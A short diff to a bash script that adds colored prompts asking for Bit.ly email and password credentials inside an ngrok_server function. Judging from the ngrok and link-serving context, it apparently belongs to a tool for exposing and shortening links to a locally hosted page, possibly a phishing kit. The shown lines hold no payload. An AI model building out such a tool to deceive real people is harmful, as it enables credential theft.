@@ -130,6 +130,19 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Server:\e[0m\e[1;77m %s\n' $send_l
 
 ngrok_server() {
 
+if [[ $email == "" ]]; then
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Bit.ly Credentials \e[0m\n'
+printf "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Email: \e[0m"
+read email
+fi
+
+
+if [[ $password == "" ]]; then
+IFS=$'\n'
+read -s -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Password: \e[0m' password
+
+fi
+printf "\n"
 
 if [[ -e ngrok ]]; then
 echo ""
@@ -278,6 +291,7 @@ fi
 if [[ $password == "" ]]; then
 IFS=$'\n'
 read -s -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Password: \e[0m' password
+
 fi
 
 server
